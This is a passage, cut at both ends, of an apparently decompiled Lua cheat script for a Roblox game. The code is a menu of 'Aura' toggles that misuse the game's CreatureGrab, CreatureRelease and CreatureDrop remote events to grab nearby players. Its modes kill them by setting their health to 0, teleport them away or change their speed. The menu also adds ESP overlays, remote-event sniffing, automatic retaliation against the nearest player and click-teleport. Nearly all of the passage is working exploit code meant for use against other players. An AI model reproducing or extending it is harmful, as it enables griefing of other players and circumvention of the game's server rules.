                                        v58, v59, v60 = ipairs(obj.Workspace:GetPartBoundsInRadius(v57.Position, 25))
                                        v61 = v60
                                        n2 = 40
                                    elseif n2 == 40 then
                                        v62, v63 = v58(v59, v61)

                                        if v62 == nil then
                                            n2 = 2
                                        else
                                            n2 = 41
                                        end
                                    elseif n2 == 41 then
                                        v61 = v62

                                        if fn40() then
                                            n2 = 42
                                        else
                                            n2 = 2
                                        end
                                    elseif n2 == 42 then
                                        if not v63.Anchored and not v63:IsDescendantOf(v56) then
                                            n2 = 43
                                        else
                                            n2 = 40
                                        end
                                    elseif n2 == 43 then
                                        playerFromCharacter = obj.Players:GetPlayerFromCharacter(v63.Parent)

                                        if (not playerFromCharacter or playerFromCharacter ~= localPlayer and not fn13(playerFromCharacter)) and v63.Name == "HumanoidRootPart" and fn22() then
                                            n2 = 44
                                        else
                                            n2 = 40
                                        end
                                    elseif n2 == 44 then
                                        pcall(function()
                                            local v64 = fn22()
                                            local str2 = math.random() >= 0.5 and "Left" or "Right"

                                            if v64 then
                                                local v65 = v64:FindFirstChild(str2 .. "Detector")

                                                if v65 then
                                                    local v66 = v65:FindFirstChild(str2 .. "Weld")

                                                    if v66 then
                                                        local blobmanSeatAndOwnerScript2 = v64:FindFirstChild("BlobmanSeatAndOwnerScript", true)

                                                        if blobmanSeatAndOwnerScript2 then
                                                            local creatureGrab2 = blobmanSeatAndOwnerScript2:FindFirstChild("CreatureGrab")

                                                            if creatureGrab2 then
                                                                pcall(function()
                                                                    creatureGrab2:FireServer(v65, v63, v66)
                                                                end)
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end)

                                        n2 = 40
                                    elseif n2 == 45 then
                                        return
                                    end
                                end
                            end)
                        end
                    end
                end
            end,
        })

        v21:AddToggle("AuraT", {
            Text = "Aura",
            Default = false,
            Callback = function(blobauraT)
                tbl2.BlobauraT = blobauraT
                tbl2.BlobauraR = tbl2.BlobauraT

                if tbl2.BlobauraT then
                    local blobauraM = tbl2.BlobauraM

                    if blobauraM == "Kill" or blobauraM == "Destroy Gucci" or blobauraM == "Speed/Jump (Control)" or blobauraM == "Kill (Beach)" or blobauraM == "Grab Aura" then
                        task.spawn(function()
                            local fn40, flag, v46, v47, v48, blobmanSeatAndOwnerScript, leftDetector, leftWeld, creatureGrab, creatureRelease, creatureDrop, v49, v50, v51, v52, v53, v54, character, humanoidRootPart, humanoid
                            local v55, flag2, flag3, flag4, v56, v57, v58, v59, v60, v61, v62, v63, playerFromCharacter, n2
                            n2 = 1

                            while true do
                                if n2 == 1 then
                                    fn40 = function()
                                        return tbl2.BlobauraR
                                    end

                                    flag = false
                                    n2 = 2
                                elseif n2 == 2 then
                                    if fn40() then
                                        n2 = 3
                                    else
                                        n2 = 45
                                    end
                                elseif n2 == 3 then
                                    task.wait(0.01)

                                    if blobauraM == "Grab Aura" then
                                        n2 = 38
                                    else
                                        n2 = 4
                                    end
                                elseif n2 == 4 then
                                    v47, v46 = charrrrrr()

                                    if v46 then
                                        n2 = 5
                                    else
                                        n2 = 2
                                    end
                                elseif n2 == 5 then
                                    v48 = fn23()

                                    if v48 then
                                        n2 = 6
                                    else
                                        n2 = 2
                                    end
                                elseif n2 == 6 then
                                    fn24(v48)
                                    blobmanSeatAndOwnerScript = v48:FindFirstChild("BlobmanSeatAndOwnerScript")
                                    leftDetector = v48:FindFirstChild("LeftDetector")
                                    leftWeld = leftDetector

                                    if leftDetector then
                                        n2 = 7
                                    else
                                        n2 = 8
                                    end
                                elseif n2 == 7 then
                                    leftWeld = leftDetector:FindFirstChild("LeftWeld")
                                    n2 = 8
                                elseif n2 == 8 then
                                    if blobmanSeatAndOwnerScript and leftDetector and leftWeld then
                                        n2 = 9
                                    else
                                        n2 = 2
                                    end
                                elseif n2 == 9 then
                                    creatureGrab = blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
                                    creatureRelease = blobmanSeatAndOwnerScript:FindFirstChild("CreatureRelease")
                                    creatureDrop = blobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")

                                    if creatureGrab and creatureRelease and creatureDrop then
                                        n2 = 10
                                    else
                                        n2 = 2
                                    end
                                elseif n2 == 10 then
                                    if flag then
                                        n2 = 11
                                    else
                                        n2 = 12
                                    end
                                elseif n2 == 11 then
                                    flag = false
                                    n2 = 13
                                elseif n2 == 12 then
                                    flag = true
                                    n2 = 13
                                elseif n2 == 13 then
                                    v49, v50, v51 = ipairs(obj.Players:GetPlayers())
                                    v52 = v51
                                    n2 = 14
                                elseif n2 == 14 then
                                    v53, v54 = v49(v50, v52)

                                    if v53 == nil then
                                        n2 = 2
                                    else
                                        n2 = 15
                                    end
                                elseif n2 == 15 then
                                    v52 = v53

                                    if fn40() then
                                        n2 = 16
                                    else
                                        n2 = 2
                                    end
                                elseif n2 == 16 then
                                    if v54 ~= localPlayer and not fn13(v54) then
                                        n2 = 17
                                    else
                                        n2 = 14
                                    end
                                elseif n2 == 17 then
                                    character = v54.Character
                                    humanoidRootPart = character

                                    if character then
                                        n2 = 18
                                    else
                                        n2 = 19
                                    end
                                elseif n2 == 18 then
                                    humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                                    n2 = 19
                                elseif n2 == 19 then
                                    humanoid = character

                                    if character then
                                        n2 = 20
                                    else
                                        n2 = 21
                                    end
                                elseif n2 == 20 then
                                    humanoid = character:FindFirstChildOfClass("Humanoid")
                                    n2 = 21
                                elseif n2 == 21 then
                                    if blobauraM == "Kill (Beach)" then
                                        n2 = 30
                                    else
                                        n2 = 22
                                    end
                                elseif n2 == 22 then
                                    v55 = humanoidRootPart

                                    if humanoidRootPart then
                                        n2 = 23
                                    else
                                        n2 = 24
                                    end
                                elseif n2 == 23 then
                                    v55 = humanoid
                                    n2 = 24
                                elseif n2 == 24 then
                                    if v55 then
                                        n2 = 25
                                    else
                                        n2 = 26
                                    end
                                elseif n2 == 25 then
                                    flag2 = false
                                    n2 = 27
                                elseif n2 == 26 then
                                    flag2 = true
                                    n2 = 27
                                elseif n2 == 27 then
                                    if flag2 then
                                        n2 = 28
                                    else
                                        n2 = 29
                                    end
                                elseif n2 == 28 then
                                    flag3 = false
                                    n2 = 36
                                elseif n2 == 29 then
                                    flag3 = true
                                    n2 = 36
                                elseif n2 == 30 then
                                    if humanoidRootPart then
                                        n2 = 31
                                    else
                                        n2 = 32
                                    end
                                elseif n2 == 31 then
                                    flag4 = false
                                    n2 = 33
                                elseif n2 == 32 then
                                    flag4 = true
                                    n2 = 33
                                elseif n2 == 33 then
                                    if flag4 then
                                        n2 = 34
                                    else
                                        n2 = 35
                                    end
                                elseif n2 == 34 then
                                    flag3 = false
                                    n2 = 36
                                elseif n2 == 35 then
                                    flag3 = true
                                    n2 = 36
                                elseif n2 == 36 then
                                    if flag3 and (v46.Position - humanoidRootPart.Position).Magnitude <= 30 then
                                        n2 = 37
                                    else
                                        n2 = 14
                                    end
                                elseif n2 == 37 then
                                    pcall(function()
                                        creatureGrab:FireServer(leftDetector, humanoidRootPart, leftWeld)
                                        creatureRelease:FireServer(leftWeld, humanoidRootPart)
                                        creatureDrop:FireServer(leftWeld, humanoidRootPart)

                                        if blobauraM == "Kill" then
                                            local v64 = flag
                                            local health = v64 and 0 or 100
                                            humanoid.Health = health
                                        elseif blobauraM ~= "Destroy Gucci" then
                                            if blobauraM == "Speed/Jump (Control)" then
                                                humanoid.WalkSpeed = tbl2.WalkspeedCont
                                                humanoid.JumpPower = tbl2.JumpPownerCont
                                            elseif blobauraM == "Kill (Beach)" then
                                                humanoidRootPart.CFrame = CFrame.new(-1150, 23, -28)
                                            end
                                        end
                                    end)

                                    n2 = 14
                                elseif n2 == 38 then
                                    v56 = getCharacter()
                                    v57 = hrp_()

                                    if v56 and v57 then
                                        n2 = 39
                                    else
                                        n2 = 2
                                    end
                                elseif n2 == 39 then
                                    v58, v59, v60 = ipairs(obj.Workspace:GetPartBoundsInRadius(v57.Position, 25))
                                    v61 = v60
                                    n2 = 40
                                elseif n2 == 40 then
                                    v62, v63 = v58(v59, v61)

                                    if v62 == nil then
                                        n2 = 2
                                    else
                                        n2 = 41
                                    end
                                elseif n2 == 41 then
                                    v61 = v62

                                    if fn40() then
                                        n2 = 42
                                    else
                                        n2 = 2
                                    end
                                elseif n2 == 42 then
                                    if not v63.Anchored and not v63:IsDescendantOf(v56) then
                                        n2 = 43
                                    else
                                        n2 = 40
                                    end
                                elseif n2 == 43 then
                                    playerFromCharacter = obj.Players:GetPlayerFromCharacter(v63.Parent)

                                    if (not playerFromCharacter or playerFromCharacter ~= localPlayer and not fn13(playerFromCharacter)) and v63.Name == "HumanoidRootPart" and fn22() then
                                        n2 = 44
                                    else
                                        n2 = 40
                                    end
                                elseif n2 == 44 then
                                    pcall(function()
                                        local v64 = fn22()
                                        if not v64 then
                                            return
                                        end
                                        local str2 = math.random() >= 0.5 and "Left" or "Right"
                                        local v65 = v64:FindFirstChild(str2 .. "Detector")
                                        if not v65 then
                                            return
                                        end
                                        local v66 = v65:FindFirstChild(str2 .. "Weld")
                                        if not v66 then
                                            return
                                        end
                                        local blobmanSeatAndOwnerScript2 = v64:FindFirstChild("BlobmanSeatAndOwnerScript", true)
                                        if not blobmanSeatAndOwnerScript2 then
                                            return
                                        end
                                        local creatureGrab2 = blobmanSeatAndOwnerScript2:FindFirstChild("CreatureGrab")

                                        if creatureGrab2 then
                                            pcall(function()
                                                creatureGrab2:FireServer(v65, v63, v66)
                                            end)
                                        end
                                    end)

                                    n2 = 40
                                elseif n2 == 45 then
                                    return
                                end
                            end
                        end)
                    end
                end
            end,
        })

        Settings:AddSlider("WalkspeedCon", {
            Text = "Walk Speed",
            Min = 0,
            Max = 500,
            Default = 16,
            Rounding = 1,
            Callback = function(walkspeedCont)
                tbl2.WalkspeedCont = walkspeedCont
            end,
        })

        Settings:AddSlider("JumppowerCon", {
            Text = "Jump Powner",
            Min = 0,
            Max = 500,
            Default = 50,
            Rounding = 1,
            Callback = function(jumpPownerCont)
                tbl2.JumpPownerCont = jumpPownerCont
            end,
        })

        v22:AddToggle("Antesp", {
            Text = "Anti-Kick ESP",
            Default = false,
            Callback = function(arg)
                if arg then
                    local players, v46, v47 = obj.Players:GetPlayers()
                    local v48 = v47
                    local v49 = players
                    local v50 = v46

                    while true do
                        local v51, v52 = v49(v50, v48)
                        if v51 == nil then
                            break
                        end
                        v48 = v51

                        if v52 ~= plr then
                            for k, v53 in workspace[v52.Name .. "SpawnedInToys"]:GetChildren() do
                                if v53:FindFirstChild("StickyPart") then
                                    local highlight = Instance.new("Highlight", v53)
                                    highlight.Adornee = v53

                                    if v53.StickyPart.StickyWeld.Part1 then
                                        highlight.FillColor = Color3.fromRGB(192, 173, 0)
                                    else
                                        highlight.FillColor = Color3.fromRGB(0, 194, 0)
                                    end

                                    v53.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                        if v53.StickyPart.StickyWeld.Part1 then
                                            highlight.FillColor = Color3.fromRGB(192, 173, 0)
                                        else
                                            highlight.FillColor = Color3.fromRGB(0, 194, 0)
                                        end
                                    end)
                                end
                            end

                            v48 = v51

                            tbl2.Contuuti["antikickesp" .. v52.Name] = workspace[v52.Name .. "SpawnedInToys"].ChildAdded:Connect(function(child)
                                task.wait(0.4)

                                if child:FindFirstChild("StickyPart") then
                                    local highlight = Instance.new("Highlight", child)
                                    highlight.Adornee = child

                                    if child.StickyPart.StickyWeld.Part1 then
                                        highlight.FillColor = Color3.fromRGB(192, 173, 0)
                                    else
                                        highlight.FillColor = Color3.fromRGB(0, 194, 0)
                                    end

                                    child.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                        if child.StickyPart.StickyWeld.Part1 then
                                            highlight.FillColor = Color3.fromRGB(192, 173, 0)
                                        else
                                            highlight.FillColor = Color3.fromRGB(0, 194, 0)
                                        end
                                    end)
                                end
                            end)
                        end
                    end
                else
                    local players, v46, v47 = obj.Players:GetPlayers()
                    local v48 = v47
                    local v49 = players
                    local v50 = v46

                    while true do
                        local v51, v52 = v49(v50, v48)
                        if v51 == nil then
                            break
                        end
                        v48 = v51

                        if v52 ~= plr then
                            if tbl2.Contuuti["antikickesp" .. v52.Name] then
                                tbl2.Contuuti["antikickesp" .. v52.Name]:Disconnect()
                                tbl2.Contuuti["antikickesp" .. v52.Name] = nil
                            end

                            for k, v53 in workspace[v52.Name .. "SpawnedInToys"]:GetChildren() do
                                if v53:FindFirstChild("StickyPart") and v53.Parent:FindFirstChild("Highlight") then
                                    v53.Parent.Highlight:Destroy()
                                end
                            end

                            v48 = v51
                        end
                    end
                end
            end,
        })

        v23:AddToggle("PCLD", {
            Text = "PCLD",
            Default = false,
            Callback = function(pcldToggle)
                tbl2.PCLDToggle = pcldToggle
                local tbl11 = {"partesp", "playercharacterlocationdetector"}

                if tbl2.PCLDToggle then
                    task.spawn(function()
                        local descendants = workspace:GetDescendants()
                        local v46, v47, v48 = ipairs(descendants)
                        local v49 = v48
                        local v50 = v46
                        local v51 = v47

                        while true do
                            local v52, v53 = v50(v51, v49)
                            if v52 == nil then
                                break
                            end
                            v49 = v52
                            if not tbl2.PCLDToggle then
                                break
                            end
                            local flag = false

                            if v53:IsA("BasePart") then
                                local v54 = string.lower(v53.Name)

                                for i, v55 in ipairs(tbl11) do
                                    if v54 == string.lower(v55) then
                                        flag = true
                                        break
                                    end
                                end

                                v49 = v52
                            end

                            if flag and not tbl2.PCLDBOX[v53] then
                                local folder = Instance.new("Folder")
                                folder.Name = "ESP_Container"
                                local selectionBox = Instance.new("SelectionBox")
                                selectionBox.Name = "LineBox"
                                selectionBox.Adornee = v53
                                selectionBox.LineThickness = 0.01
                                selectionBox.Color3 = tbl2.PCLDLine
                                selectionBox.SurfaceColor3 = tbl2.PCLDSurface
                                selectionBox.SurfaceTransparency = 0.95
                                selectionBox.Transparency = 0
                                selectionBox.Parent = folder
                                local boxHandleAdornment = Instance.new("BoxHandleAdornment")
                                boxHandleAdornment.Name = "FillBox"
                                boxHandleAdornment.Adornee = v53
                                boxHandleAdornment.Size = v53.Size
                                boxHandleAdornment.Color3 = tbl2.PCLDFill
                                boxHandleAdornment.Transparency = 0.9
                                boxHandleAdornment.AlwaysOnTop = true
                                boxHandleAdornment.ZIndex = 5
                                boxHandleAdornment.Parent = folder
                                folder.Parent = game:GetService("CoreGui")
                                tbl2.PCLDBOX[v53] = folder

                                v53.AncestryChanged:Connect(function(child, parent)
                                    if not parent and tbl2.PCLDBOX[v53] then
                                        tbl2.PCLDBOX[v53]:Destroy()
                                        tbl2.PCLDBOX[v53] = nil
                                    end
                                end)
                            end

                            if v52 % 1000 == 0 then
                                task.wait()
                            end
                        end
                    end)

                    tbl2.PCLDCONN = workspace.DescendantAdded:Connect(function(descendant)
                        local flag = false

                        if descendant:IsA("BasePart") then
                            local v46 = string.lower(descendant.Name)

                            for i, v47 in ipairs(tbl11) do
                                if v46 == string.lower(v47) then
                                    flag = true
                                    break
                                end
                            end
                        end

                        if flag then
                            task.wait(0.1)

                            if tbl2.PCLDToggle and descendant:IsDescendantOf(workspace) and not tbl2.PCLDBOX[descendant] then
                                local folder = Instance.new("Folder")
                                folder.Name = "ESP_Container"
                                local selectionBox = Instance.new("SelectionBox")
                                selectionBox.Name = "LineBox"
                                selectionBox.Adornee = descendant
                                selectionBox.LineThickness = 0.01
                                selectionBox.Color3 = tbl2.PCLDLine
                                selectionBox.SurfaceColor3 = tbl2.PCLDSurface
                                selectionBox.SurfaceTransparency = 0.95
                                selectionBox.Transparency = 0
                                selectionBox.Parent = folder
                                local boxHandleAdornment = Instance.new("BoxHandleAdornment")
                                boxHandleAdornment.Name = "FillBox"
                                boxHandleAdornment.Adornee = descendant
                                boxHandleAdornment.Size = descendant.Size
                                boxHandleAdornment.Color3 = tbl2.PCLDFill
                                boxHandleAdornment.Transparency = 0.9
                                boxHandleAdornment.AlwaysOnTop = true
                                boxHandleAdornment.ZIndex = 5
                                boxHandleAdornment.Parent = folder
                                folder.Parent = game:GetService("CoreGui")
                                tbl2.PCLDBOX[descendant] = folder

                                descendant.AncestryChanged:Connect(function(child, parent)
                                    if not parent and tbl2.PCLDBOX[descendant] then
                                        tbl2.PCLDBOX[descendant]:Destroy()
                                        tbl2.PCLDBOX[descendant] = nil
                                    end
                                end)
                            end
                        end
                    end)
                else
                    if tbl2.PCLDCONN then
                        tbl2.PCLDCONN:Disconnect()
                        tbl2.PCLDCONN = nil
                    end

                    for k, v46 in pairs(tbl2.PCLDBOX) do
                        if v46 then
                            v46:Destroy()
                        end
                    end

                    tbl2.PCLDBOX = {}
                end
            end,
        })

        v23:AddLabel("PCLD Line Color"):AddColorPicker("pcld1", {
            Default = Color3.fromRGB(0, 255, 255),
            Title = "PCLD Line Color",
            Callback = function(pcldLine)
                tbl2.PCLDLine = pcldLine
                local v46 = pairs
                local pcldbox = tbl2.PCLDBOX
                local tbl11 = pcldbox or {}

                for k, v47 in v46(tbl11) do
                    if v47 and v47:FindFirstChild("LineBox") then
                        v47.LineBox.Color3 = pcldLine
                    end
                end
            end,
        })

        v23:AddLabel("PCLD Surface Color"):AddColorPicker("pcld2", {
            Default = Color3.fromRGB(0, 100, 255),
            Title = "PCLD Surface Color",
            Callback = function(pcldSurface)
                tbl2.PCLDSurface = pcldSurface
                local v46 = pairs
                local pcldbox = tbl2.PCLDBOX
                local tbl11 = pcldbox or {}

                for k, v47 in v46(tbl11) do
                    if v47 and v47:FindFirstChild("LineBox") then
                        v47.LineBox.SurfaceColor3 = pcldSurface
                    end
                end
            end,
        })

        v23:AddLabel("PCLD Fill Color"):AddColorPicker("pcld3", {
            Default = Color3.fromRGB(0, 0, 255),
            Title = "PCLD Fill Color",
            Callback = function(pcldFill)
                tbl2.PCLDFill = pcldFill
                local v46 = pairs
                local pcldbox = tbl2.PCLDBOX
                local tbl11 = pcldbox or {}

                for k, v47 in v46(tbl11) do
                    if v47 and v47:FindFirstChild("FillBox") then
                        v47.FillBox.Color3 = pcldFill
                    end
                end
            end,
        })

        v24:AddToggle("blesp", {
            Text = "BlackHole (ESP)",
            Default = false,
            Callback = function(blackHoleESP)
                tbl2.blackHoleESP = blackHoleESP

                if blackHoleESP then
                    for i, child in ipairs(obj.Workspace:GetChildren()) do
                        if child.Name == "BlackHoleKick" and not tbl2.BlackholeSelectionB[child] then
                            local selectionBox = Instance.new("SelectionBox")
                            selectionBox.Adornee = child
                            selectionBox.LineThickness = 0.05
                            selectionBox.Color3 = Color3.fromRGB(0, 191, 255)
                            selectionBox.Parent = child
                            tbl2.BlackholeSelectionB[child] = selectionBox
                            local hole = child:FindFirstChild("Hole")

                            if hole and hole:IsA("BasePart") then
                                local billboardGui = hole:FindFirstChildOfClass("BillboardGui")

                                if billboardGui then
                                    billboardGui.AlwaysOnTop = true
                                end

                                local v46 = getCharacter()

                                if v46 and v46:FindFirstChild("HumanoidRootPart") then
                                    local humanoidRootPart = v46.HumanoidRootPart
                                    local attachment = Instance.new("Attachment")
                                    attachment.Parent = hole
                                    local attachment2 = Instance.new("Attachment")
                                    attachment2.Parent = humanoidRootPart
                                    local beam = Instance.new("Beam")
                                    beam.Attachment0 = attachment2
                                    beam.Attachment1 = attachment
                                    beam.Color = ColorSequence.new(Color3.fromRGB(0, 191, 255))
                                    beam.Width0 = 0.1
                                    beam.Width1 = 0.1
                                    beam.Parent = hole

                                    tbl2.BlackholeBeam[child] = {
                                        beam = beam,
                                        holeAttachment = attachment,
                                        localAttachment = attachment2,
                                    }
                                end
                            end
                        end
                    end

                    if tbl2.BlackHoleConnection then
                        tbl2.BlackHoleConnection:Disconnect()
                    end

                    tbl2.BlackHoleConnection = obj.Workspace.ChildAdded:Connect(function(child)
                        if tbl2.blackHoleESP and child.Name == "BlackHoleKick" and not tbl2.BlackholeSelectionB[child] then
                            local selectionBox = Instance.new("SelectionBox")
                            selectionBox.Adornee = child
                            selectionBox.LineThickness = 0.05
                            selectionBox.Color3 = Color3.fromRGB(0, 191, 255)
                            selectionBox.Parent = child
                            tbl2.BlackholeSelectionB[child] = selectionBox
                            local hole = child:FindFirstChild("Hole")

                            if hole and hole:IsA("BasePart") then
                                local billboardGui = hole:FindFirstChildOfClass("BillboardGui")

                                if billboardGui then
                                    billboardGui.AlwaysOnTop = true
                                end

                                local v46 = getCharacter()

                                if v46 and v46:FindFirstChild("HumanoidRootPart") then
                                    local humanoidRootPart = v46.HumanoidRootPart
                                    local attachment = Instance.new("Attachment")
                                    attachment.Parent = hole
                                    local attachment2 = Instance.new("Attachment")
                                    attachment2.Parent = humanoidRootPart
                                    local beam = Instance.new("Beam")
                                    beam.Attachment0 = attachment2
                                    beam.Attachment1 = attachment
                                    beam.Color = ColorSequence.new(Color3.fromRGB(0, 191, 255))
                                    beam.Width0 = 0.1
                                    beam.Width1 = 0.1
                                    beam.Parent = hole

                                    tbl2.BlackholeBeam[child] = {
                                        beam = beam,
                                        holeAttachment = attachment,
                                        localAttachment = attachment2,
                                    }
                                end
                            end
                        end
                    end)
                else
                    if tbl2.BlackHoleConnection then
                        tbl2.BlackHoleConnection:Disconnect()
                        tbl2.BlackHoleConnection = nil
                    end

                    for k in pairs(tbl2.BlackholeSelectionB) do
                        if tbl2.BlackholeSelectionB[k] then
                            tbl2.BlackholeSelectionB[k]:Destroy()
                            tbl2.BlackholeSelectionB[k] = nil
                        end

                        if tbl2.BlackholeBeam[k] then
                            if tbl2.BlackholeBeam[k].beam then
                                tbl2.BlackholeBeam[k].beam:Destroy()
                            end

                            if tbl2.BlackholeBeam[k].holeAttachment then
                                tbl2.BlackholeBeam[k].holeAttachment:Destroy()
                            end

                            if tbl2.BlackholeBeam[k].localAttachment then
                                tbl2.BlackholeBeam[k].localAttachment:Destroy()
                            end

                            tbl2.BlackholeBeam[k] = nil
                        end
                    end
                end
            end,
        })

        Players_:AddToggle("JoinNotify", {
            Text = "Join",
            Default = false,
            Callback = function(joinNotify)
                tbl2.JoinNotify = joinNotify
            end,
        })

        Players_:AddToggle("LeaveNotify", {
            Text = "Leave",
            Default = false,
            Callback = function(leaveNotify)
                tbl2.LeaveNotify = leaveNotify
            end,
        })

        Misc:AddToggle("DetectPack", {
            Text = "Detect packets",
            Default = false,
            Callback = function(arg)
                if arg then
                    if tbl2.PacketCon and #tbl2.PacketCon > 0 then
                        return
                    end
                    local packetCon = tbl2.PacketCon
                    local packetCon2 = packetCon or {}
                    tbl2.PacketCon = packetCon2

                    local function fn40(arg2, arg3, ...)
                        local tbl11 = {...}
                        local n2 = 0

                        for i, v46 in ipairs(tbl11) do
                            if typeof(v46) == "string" then
                                n2 = n2 + #v46
                            end
                        end

                        if n2 < tbl2.byte_thres then
                            return
                        end
                        local now2 = tick()
                        local lastPacketNotify = tbl2.lastPacketNotify
                        local n3 = lastPacketNotify or 0
                        if now2 - n3 < tbl2.PacketCooldown then
                            return
                        end
                        tbl2.lastPacketNotify = tick()
                        local v46 = nil

                        for i, v47 in ipairs(tbl11) do
                            if typeof(v47) == "Instance" then
                                if not v47:IsA("Player") then
                                    if not v47:IsA("Model") then
                                        if not v47:IsA("BasePart") and not v47:IsA("Tool") then
                                            continue
                                        end
                                        local model = v47:FindFirstAncestorOfClass("Model")

                                        if model then
                                            local playerFromCharacter = Players:GetPlayerFromCharacter(model)
                                            if playerFromCharacter then
                                                v46 = playerFromCharacter
                                                break
                                            end
                                            continue
                                        end

                                        continue
                                    end

                                    local playerFromCharacter = Players:GetPlayerFromCharacter(v47)
                                    if playerFromCharacter then
                                        v46 = playerFromCharacter
                                        break
                                    end
                                    continue
                                end

                                v46 = v47
                                break
                            end
                        end

                        local v47 = v46 or LocalPlayer
                        local v48 = v47
                        local displayName = v47.DisplayName
                        local str2 = displayName

                        if v48 == LocalPlayer then
                            str2 = displayName .. " (You)"
                        end

                        local n4 = n2 / 1048576
                        local tbl12 = {}
                        local tbl13 = {}
                        local v49, v50, v51 = ipairs(tbl11)
                        local v52 = v51
                        local v53 = v49
                        local v54 = v50

                        while true do
                            local v55, v56 = v53(v54, v52)
                            if v55 == nil then
                                break
                            end
                            v52 = v55
                            local kind = typeof(v56)
                            local str3

                            if kind == "string" then
                                local str4 = v56

                                if #v56 > 80 then
                                    str4 = v56:sub(1, 80) .. "... (+" .. #v56 - 80 .. " chars)"
                                end

                                str3 = "str:" .. str4
                            elseif kind == "Instance" then
                                str3 = "inst:" .. v56.ClassName .. "(" .. v56.Name .. ")"
                            elseif kind == "table" then
                                local tbl14 = {}
                                local n5 = 0

                                for k, v57 in pairs(v56) do
                                    local n6 = n5 + 1
                                    n5 = n6

                                    if n6 <= 5 then
                                        table.insert(tbl14, tostring(v57))
                                    end
                                end

                                v52 = v55
                                str3 = "tbl:table[" .. n5 .. "] { " .. table.concat(tbl14, ", ") .. " ... }"
                            else
                                str3 = kind .. ":" .. tostring(v56)
                            end

                            local v57 = tbl12[str3]
                            local n5 = v57 or 0
                            tbl12[str3] = n5 + 1
                        end

                        for k, v55 in pairs(tbl12) do
                            if v55 > 1 then
                                table.insert(tbl13, k .. " x" .. v55)
                            else
                                table.insert(tbl13, k)
                            end
                        end

                        library:Notify({
                            Title = string.format("[%s] %s", arg2, arg3),
                            Description = string.format("Player: %s\nSize: %.3f MB\nArgs:\n%s", str2, n4, table.concat(tbl13, "\n")),
                            Duration = 4,
                        })
                    end

                    local extendGrabLine2 = obj.ReplicatedStorage.GrabEvents:WaitForChild("ExtendGrabLine", 5)

                    if extendGrabLine2 then
                        table.insert(tbl2.PacketCon, extendGrabLine2.OnClientEvent:Connect(function(...)
                            fn40("Grab", "ExtendGrabLine", ...)
                        end))
                    end

                    local function fn41(arg2)
                        if arg2:IsA("RemoteEvent") and arg2.Name == "RelayClientAnimation" and arg2.Parent and arg2.Parent.Name == "BlobmanAnimations" then
                            local parent = arg2.Parent.Parent
                            local name = parent and arg2.Parent.Parent.Name or "Unknown"

                            table.insert(tbl2.PacketCon, arg2.OnClientEvent:Connect(function(...)
                                fn40("Blob", name, ...)
                            end))
                        end
                    end

                    for i, descendant in ipairs(workspace:GetDescendants()) do
                        fn41(descendant)
                    end

                    table.insert(tbl2.PacketCon, workspace.DescendantAdded:Connect(function(descendant)
                        fn41(descendant)
                    end))
                elseif tbl2.PacketCon then
                    for i, v46 in ipairs(tbl2.PacketCon) do
                        pcall(function()
                            v46:Disconnect()
                        end)
                    end

                    tbl2.PacketCon = {}
                end
            end,
        })

        Misc:AddToggle("KickNotify", {
            Text = "BlackHoleKick",
            Default = false,
            Callback = function(kickNotify)
                tbl2.KickNotify = kickNotify

                if kickNotify then
                    if not tbl2.KickConnection then
                        tbl2.KickConnection = obj.Workspace.ChildAdded:Connect(function(child)
                            if child.Name ~= "BlackHoleKick" then
                                return
                            end
                            task.wait(0.05)
                            local isBasePart = child:IsA("BasePart")
                            local position = isBasePart and child.Position

                            if not position then
                                local isModel = child:IsA("Model")
                                position = isModel and child:GetPivot().Position
                            end

                            if not position then
                                return
                            end
                            local v46 = nil
                            local huge = math.huge

                            for i, player in ipairs(obj.Players:GetPlayers()) do
                                if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                    local magnitude = (player.Character.HumanoidRootPart.Position - position).Magnitude

                                    if magnitude < huge then
                                        huge = magnitude
                                        v46 = player
                                    end
                                end
                            end

                            if v46 then
                                fn14(v46, "Kick")
                            end
                        end)
                    end
                elseif tbl2.KickConnection then
                    tbl2.KickConnection:Disconnect()
                    tbl2.KickConnection = nil
                end
            end,
        })

        keybinds:AddDropdown("TPmode", {
            Text = "TP Mode",
            Default = "ClickTP",
            Values = {"ClickTP", "ClickTP (Hold)"},
            Callback = function(tpMode)
                tbl2.TPMode = tpMode
                tbl2.holdtoggletp = false

                if tbl2.TPZholdCn then
                    tbl2.TPZholdCn:Disconnect()
                    tbl2.TPZholdCn = nil
                end
            end,
        })

        keybinds:AddToggle("ClickTPZ", {
            Text = "Click TP (Z)",
            Default = false,
            Callback = function(clickTPfutuu)
                tbl2.ClickTPfutuu = clickTPfutuu
                local touchEnabled = obj.UserInputService.TouchEnabled

                if tbl2.TPZcon then
                    tbl2.TPZcon:Disconnect()
                    tbl2.TPZcon = nil
                end

                if tbl2.TPZconall then
                    tbl2.TPZconall:Disconnect()
                    tbl2.TPZconall = nil
                end

                if tbl2.TPZholdCn then
                    tbl2.TPZholdCn:Disconnect()
                    tbl2.TPZholdCn = nil
                end

                if tbl2.MobileTPDownCon then
                    tbl2.MobileTPDownCon:Disconnect()
                    tbl2.MobileTPDownCon = nil
                end

                if tbl2.MobileTPUpCon then
                    tbl2.MobileTPUpCon:Disconnect()
                    tbl2.MobileTPUpCon = nil
                end

                if tbl2.MobileTPLeaveCon then
                    tbl2.MobileTPLeaveCon:Disconnect()
                    tbl2.MobileTPLeaveCon = nil
                end

                if tbl2.MobileTPClickCon then
                    tbl2.MobileTPClickCon:Disconnect()
                    tbl2.MobileTPClickCon = nil
                end

                tbl2.holdtoggletp = false

                if tbl2.ClickTPfutuu then
                    screenGui2.Parent = PlayerGui
                    imageButton2.Visible = true
                    imageButton2.Active = true
                    imageLabel2.Visible = true
                else
                    imageButton2.Visible = false
                    imageButton2.Active = false
                    imageLabel2.Visible = false
                end

                if tbl2.ClickTPfutuu then
                    if touchEnabled then
                        tbl2.MobileTPDownCon = imageButton2.MouseButton1Down:Connect(function()
                            if tbl2.TPMode == "ClickTP (Hold)" and tbl2.ClickTPfutuu then
                                tbl2.holdtoggletp = true

                                if not tbl2.TPZholdCn then
                                    tbl2.TPZholdCn = obj.RunService.Heartbeat:Connect(function()
                                        if tbl2.holdtoggletp and tbl2.ClickTPfutuu then
                                            local tpzContro = tbl2.TPZContro
